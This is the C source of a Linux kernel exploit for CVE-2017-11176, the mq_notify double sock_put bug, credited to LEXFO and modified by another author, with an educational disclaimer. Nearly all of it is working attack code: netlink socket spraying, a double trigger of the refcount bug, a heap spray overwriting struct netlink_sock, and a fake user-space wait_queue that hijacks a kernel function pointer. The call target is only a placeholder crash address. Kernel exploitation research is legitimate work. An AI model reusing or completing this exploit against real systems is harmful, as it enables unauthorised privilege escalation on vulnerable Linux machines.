/*
 * CVE-2017-11176: "mq_notify: double sock_put()" by LEXFO (2018).
 * modified by kylebot
 *
 * DISCLAIMER: The following code is for EDUCATIONAL purpose only. Do not
 * use it on a system without authorizations.
 *
 * WARNING: The exploit WILL NOT work on your target, it requires modifications!
 *
 * Compile with:
 *
 *  gcc -fpic -O0 -std=c99 -Wall -pthread cve-2017-11176.c -o exploit
 *
 * For a complete explanation / analysis, please read the following series:
 *
 * - https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part1.html
 * - https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part2.html
 * - https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part3.html
 * - https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part4.html
 */

#define _GNU_SOURCE
#include <asm/types.h>
#include <mqueue.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <linux/netlink.h>
#include <pthread.h>
#include <errno.h>
#include <stdbool.h>
#include <sched.h>
#include <stddef.h>
#include <sys/mman.h>
#include <stdint.h>
#include <signal.h>
#include "libexp.h"

#ifndef SOL_NETLINK
#define SOL_NETLINK 270
#endif

// ============================================================================
// ----------------------------------------------------------------------------
// ============================================================================
#define CRASH_IP 0xffffffffdeadbeef

#define NOTIFY_COOKIE_LEN 32
#define MAX_SOCK_PID_SPRAY 300
#define MAGIC_NL_PID 0x11a5dcee
#define MAGIC_NL_GROUPS 0x0
#define ULAND_WQ_ADDR 0x1000000

// ----------------------------------------------------------------------------

// avoid library wrappers
#define _mq_notify(mqdes, sevp) syscall(__NR_mq_notify, mqdes, sevp)

// ----------------------------------------------------------------------------

#define BUILD_BUG_ON(cond) ((void)sizeof(char[1 - 2 * !!(cond)]))

// ----------------------------------------------------------------------------

// target specific offset
#define NLK_WAIT_OFFSET                 0x2b0

// ----------------------------------------------------------------------------

struct unblock_thread_arg
{
	int sock_fd;
	int unblock_fd;
	bool is_ready; // we can use pthread barrier instead
};

struct sock_pid
{
	int sock_fd;
	uint32_t pid;
};

// ----------------------------------------------------------------------------

struct list_head
{
	struct list_head *next, *prev;
};

struct wait_queue_head
{
	int slock;
	struct list_head task_list;
};

typedef int (*wait_queue_func_t)(void *wait, unsigned mode, int flags, void *key);

struct wait_queue
{
	unsigned int flags;
#define WQ_FLAG_EXCLUSIVE 0x01
	void *private;
	wait_queue_func_t func;
	struct list_head task_list;
};

// ----------------------------------------------------------------------------
static volatile struct list_head  g_fake_next_elt;
static volatile struct wait_queue *g_uland_wq_elt;

static struct sock_pid g_target;
static struct sock_pid g_guard;
static int unblock_fd;
char payload[0x800];

// ============================================================================
// ----------------------------------------------------------------------------
// ============================================================================

/*
 * Creates a NETLINK_USERSOCK netlink socket, binds it and retrieves its pid.
 * Argument @sp must not be NULL.
 *
 * Returns 0 on success, -1 on error.
 */

static int create_netlink_candidate(struct sock_pid *sp)
{
	struct sockaddr_nl addr = {
	  .nl_family = AF_NETLINK,
	  .nl_pad = 0,
	  .nl_pid = 0, // zero to use netlink_autobind()
	  .nl_groups = 0 // no groups

	};
	size_t addr_len = sizeof(addr);

	if ((sp->sock_fd = socket(AF_NETLINK, SOCK_DGRAM, NETLINK_USERSOCK)) == -1)
	{
	  perror("[-] socket");
	  goto fail;
	}

	if (bind(sp->sock_fd, (struct sockaddr*)&addr, sizeof(addr)) == -1)
	{
	  perror("[-] bind");
	  goto fail_close;
	}

	if (getsockname(sp->sock_fd, (struct sockaddr *)&addr, (socklen_t *)&addr_len))
	{
	  perror("[-] getsockname");
	  goto fail_close;
	}
	
	sp->pid = addr.nl_pid;

	return 0;

fail_close:
	close(sp->sock_fd);
fail:
	sp->sock_fd = -1;
	sp->pid = -1;
	return -1;
}

// ----------------------------------------------------------------------------

/*
 * Parses @proto hash table from '/proc/net/netlink' and allocates/fills the
 * @pids array. The total numbers of pids matched is stored in @nb_pids.
 *
 * A typical output looks like:
 *
 *    $ cat /proc/net/netlink
 *    sk       Eth Pid    Groups   Rmem     Wmem     Dump     Locks     Drops
 *    ffff88001eb47800 0   0      00000000 0        0        (null) 2        0       
 *    ffff88001fa65800 6   0      00000000 0        0        (null) 2        0     
 *
 * Every line is printed from netlink_seq_show():
 *
 *    seq_printf(seq, "%p %-3d %-6d %08x %-8d %-8d %p %-8d %-8d\n"
 *
 * Returns 0 on success, -1 on error.
 */

static int parse_proc_net_netlink(int **pids, size_t *nb_pids, uint32_t proto)
{
	int proc_fd;
	char buf[4096];
	int ret;
	char *ptr;
	char *eol_token;
	size_t nb_bytes_read = 0;
	size_t tot_pids = 1024;

	*pids = NULL;
	*nb_pids = 0;

	if ((*pids = calloc(tot_pids, sizeof(**pids))) == NULL)
	{
	  perror("[-] not enough memory");
	  goto fail;
	}
	
	memset(buf, 0, sizeof(buf));
	if ((proc_fd = open("/proc/net/netlink", O_RDONLY)) < 0)
	{
	  perror("[-] open");
	  goto fail;
	}

read_next_block:
	if ((ret = read(proc_fd, buf, sizeof(buf))) < 0)
	{
	  perror("[-] read");
	  goto fail_close;
	}
	else if (ret == 0) // no more line to read
	{
	  goto parsing_complete;
	}

	ptr = buf;

	if (strstr(ptr, "sk") != NULL) // this is the first line
	{ 
	  if ((eol_token = strstr(ptr, "\n")) == NULL)
	  {
	    // XXX: we don't handle this case, we can't even read one line...
	    printf("[-] can't find end of first line\n");
	    goto fail_close;
	  }
	  nb_bytes_read += eol_token - ptr + 1;
	  ptr = eol_token + 1; // skip the first line
	}

parse_next_line:
	// this is a "normal" line
	if ((eol_token = strstr(ptr, "\n")) == NULL) // current line is incomplete
	{
	  if (lseek(proc_fd, nb_bytes_read, SEEK_SET) == -1)
	  {
	    perror("[-] lseek");
	    goto fail_close;
	  }
	  goto read_next_block;
	}
	else
	{
	  void *cur_addr;
	  int cur_proto;
	  int cur_pid;

	  sscanf(ptr, "%p %d %d", &cur_addr, &cur_proto, &cur_pid);

	  if (cur_proto == proto)
	  {
	    if (*nb_pids >= tot_pids) // current array is not big enough, make it grow
	    {
	      tot_pids *= 2;
	      if ((*pids = realloc(*pids, tot_pids * sizeof(int))) == NULL)
	      {
	        printf("[-] not enough memory\n");
	        goto fail_close;
	      }
	    }

	    *(*pids + *nb_pids) = cur_pid;
	    *nb_pids = *nb_pids + 1;
	  }

	  nb_bytes_read += eol_token - ptr + 1;
	  ptr = eol_token + 1;
	  goto parse_next_line;
	}

parsing_complete:
	close(proc_fd);
	return 0;

fail_close:
	close(proc_fd);
fail:
	if (*pids != NULL)
	  free(*pids);
	*nb_pids = 0;
	return -1;
}

// ----------------------------------------------------------------------------

/*
 * Prepare multiple netlink sockets and search "adjacent" ones. Arguments
 * @target and @guard must not be NULL.
 *
 * Returns 0 on success, -1 on error.
 */

static int find_netlink_candidates(struct sock_pid *target, struct sock_pid *guard)
{
	struct sock_pid candidates[MAX_SOCK_PID_SPRAY];
	int *pids = NULL;
	size_t nb_pids;
	int i, j;
	int nb_owned;
	int ret = -1;

	target->sock_fd = -1;
	guard->sock_fd = -1;

	// allocate a bunch of netlink sockets
	for (i = 0; i < MAX_SOCK_PID_SPRAY; ++i)
	{
	  if (create_netlink_candidate(&candidates[i]))
	  { 
	    printf("[-] failed to create a new candidate\n");
	    goto release_candidates;
	  }
	}
	printf("[+] %d candidates created\n", MAX_SOCK_PID_SPRAY);

	if (parse_proc_net_netlink(&pids, &nb_pids, NETLINK_USERSOCK))
	{
	  printf("[-] failed to parse '/proc/net/netlink'\n");
	  goto release_pids;
	}
	printf("[+] parsing '/proc/net/netlink' complete\n");

	// find two consecutives pid that we own (slow algorithm O(N*M))
	i = nb_pids;
	while (--i > 0)
	{
	  guard->pid = pids[i];
	  target->pid = pids[i - 1];
	  nb_owned = 0;

	  // the list is not ordered by pid, so we do a full walking
	  for (j = 0; j < MAX_SOCK_PID_SPRAY; ++j) 
	  {
	    if (candidates[j].pid == guard->pid)
	    {
	      guard->sock_fd = candidates[j].sock_fd;
	      nb_owned++;
	    }
	    else if (candidates[j].pid == target->pid)
	    {
	      target->sock_fd = candidates[j].sock_fd;
	      nb_owned++;
	    }

	    if (nb_owned == 2)
	      goto found;
	  }

	  // reset sock_fd to release them
	  guard->sock_fd = -1;
	  target->sock_fd = -1;
	}

	// we didn't found any valid candidates, release and quit
	goto release_pids;

found:
	printf("[+] adjacent candidates found!\n");
	ret = 0; // we succeed

release_pids:
	i = MAX_SOCK_PID_SPRAY; // reset the candidate counter for release
	if (pids != NULL)
	  free(pids);

release_candidates:
	while (--i >= 0)
	{
	  // do not release the target/guard sockets
	  if ((candidates[i].sock_fd != target->sock_fd) &&
	      (candidates[i].sock_fd != guard->sock_fd))
	  {
	    close(candidates[i].sock_fd);
	  }
	}

	return ret;
} 

// ============================================================================
// ----------------------------------------------------------------------------
// ============================================================================

static void* unblock_thread(void *arg)
{
	struct unblock_thread_arg *uta = (struct unblock_thread_arg*) arg;
	int val = 3535; // need to be different than zero

	// notify the main thread that the unblock thread has been created. It *must*
	// directly call mq_notify().
	uta->is_ready = true; 

	sleep(2); // gives some time for the main thread to block

	printf("[ ][unblock] closing %d fd\n", uta->sock_fd);
	close(uta->sock_fd);

	printf("[ ][unblock] unblocking now\n");
	if (setsockopt(uta->unblock_fd, SOL_NETLINK, NETLINK_NO_ENOBUFS, &val, sizeof(val)))
	  perror("[+] setsockopt");
	return NULL;
}

// ----------------------------------------------------------------------------

static int decrease_sock_refcounter(int sock_fd, int unblock_fd)
{
	pthread_t tid;
	struct sigevent sigev;
	struct unblock_thread_arg uta;
	char sival_buffer[NOTIFY_COOKIE_LEN];

	// initialize the unblock thread arguments
	uta.sock_fd = sock_fd;
	uta.unblock_fd = unblock_fd;
	uta.is_ready = false;

	// initialize the sigevent structure
	memset(&sigev, 0, sizeof(sigev));
	sigev.sigev_notify = SIGEV_THREAD;
	sigev.sigev_value.sival_ptr = sival_buffer;
	sigev.sigev_signo = uta.sock_fd;

	printf("[ ] creating unblock thread...\n");
	if ((errno = pthread_create(&tid, NULL, unblock_thread, &uta)) != 0)
	{
	  perror("[-] pthread_create");
	  goto fail;
	}
	while (uta.is_ready == false) // spinlock until thread is created
	  ;
	printf("[+] unblocking thread has been created!\n");

	printf("[ ] get ready to block\n");
	if ((_mq_notify((mqd_t)-1, &sigev) != -1) || (errno != EBADF)) {
	  perror("[-] mq_notify");
	  goto fail;
	}
	printf("[+] mq_notify succeed\n");

	return 0;

fail:
	return -1;
}

// ----------------------------------------------------------------------------

static int fill_receive_buffer(struct sock_pid *target, struct sock_pid *guard)
{
	char buf[1024*10];
	int new_size = 0; // this will be reset to SOCK_MIN_RCVBUF

	struct sockaddr_nl addr = {
		.nl_family = AF_NETLINK,
		.nl_pad = 0,
		.nl_pid = target->pid, // use the target's pid
		.nl_groups = 0 // no groups
	};

	struct iovec iov = {
		.iov_base = buf,
		.iov_len = sizeof(buf)
	};

	struct msghdr mhdr = {
		.msg_name = &addr,
		.msg_namelen = sizeof(addr),
		.msg_iov = &iov,
		.msg_iovlen = 1,
		.msg_control = NULL,
		.msg_controllen = 0,
		.msg_flags = 0, 
	};

	printf("[ ] preparing blocking netlink socket\n");

	if(setsockopt(target->sock_fd, SOL_SOCKET, SO_RCVBUF, &new_size, sizeof(new_size)))
		perror("[-] setsockopt"); // no worry if it fails, it is just an optim.
	else
		printf("[+] receive buffer reduced\n");

	printf("[ ] flooding socket\n");
	while (sendmsg(guard->sock_fd, &mhdr, MSG_DONTWAIT) > 0);
	if (errno != EAGAIN) {
		perror("[-] sendmsg");
		goto fail;
	}
	printf("[+] flood completed\n");

	printf("[+] blocking socket ready\n");

	return 0;

fail:
	printf("[-] failed to prepare blocking socket\n");
	return -1;
}

// ============================================================================
// ----------------------------------------------------------------------------
// ============================================================================

void context_setup(void)
{
	if (find_netlink_candidates(&g_target, &g_guard)) {
		error_out("[-] failed to find netlink candidates\n");
	}
	printf("[+] netlink candidates ready:\n");
	printf("[+] target.pid = %d\n", g_target.pid);
	printf("[+] guard.pid  = %d\n", g_guard.pid);

	if (fill_receive_buffer(&g_target, &g_guard))
		error_out("fail to fill receive buffer");
}

void payload_setup(void)
{
	// mmap fake wait_queue object
	g_uland_wq_elt = mmap((void *)ULAND_WQ_ADDR, 0x1000, PROT_READ|PROT_WRITE, MAP_FIXED | MAP_SHARED | MAP_ANONYMOUS | MAP_POPULATE | MAP_LOCKED, -1, 0);
	if(g_uland_wq_elt != (void *)ULAND_WQ_ADDR) error_out("");

	// initialize heap spray payload that overwrites struct netlink_sock in kernel
	memset(payload, 'A', sizeof(payload));
	struct wait_queue_head *nlk_wait = (struct wait_queue_head*)&payload[0x18 + NLK_WAIT_OFFSET];
	nlk_wait->slock = 0;
	nlk_wait->task_list.next = (struct list_head*)&g_uland_wq_elt->task_list;
	nlk_wait->task_list.prev = (struct list_head*)&g_uland_wq_elt->task_list;

	// initialise the "fake" second element (because of list_for_each_entry_safe())
	g_fake_next_elt.next = (struct list_head*)&g_fake_next_elt; // point to itself
	g_fake_next_elt.prev = (struct list_head*)&g_fake_next_elt; // point to itself

	// initialize user land wait_queue object
	g_uland_wq_elt->flags = WQ_FLAG_EXCLUSIVE; // set to exit after the first arbitrary call
	g_uland_wq_elt->private = NULL; // unused
	g_uland_wq_elt->func = (wait_queue_func_t) CRASH_IP; // <----- arbitrary call!
	g_uland_wq_elt->task_list.next = (struct list_head*)&g_fake_next_elt;
	g_uland_wq_elt->task_list.prev = (struct list_head*)&g_fake_next_elt;
}

void exploit(void)
{
	int sock_fd2 = -1;
	unblock_fd = dup(g_target.sock_fd);
	sock_fd2 = dup(g_target.sock_fd);
	if(unblock_fd < 0 || sock_fd2 < 0) error_out("dup");

	printf("[+] netlink fd duplicated (unblock_fd=%d, sock_fd2=%d)\n", unblock_fd, sock_fd2);

	// trigger the bug twice AND immediatly realloc!
	if (decrease_sock_refcounter(g_target.sock_fd, unblock_fd) ||
		decrease_sock_refcounter(sock_fd2, unblock_fd))
		error_out("fail to decrease refcount");

	// heap spray!
	nonsense();
	msg_spray(payload, 0x800-0x30, 0x100);

	// close it before invoking the arbitrary call
	close(g_guard.sock_fd);
	printf("[+] guard socket closed\n");
}

void trigger(void)
{
	// trigger the arbitrary call primitive
	printf("[ ] invoking arbitrary call primitive...\n");
	int val = 3535; // need to be different than zero
	if(setsockopt(unblock_fd, SOL_NETLINK, NETLINK_NO_ENOBUFS, &val, sizeof(val))) error_out("[-] setsockopt");
}

int main(void)
{
	sleep(1);
	payload_setup();
	context_setup();
	exploit();
	trigger();
	return 0;
}

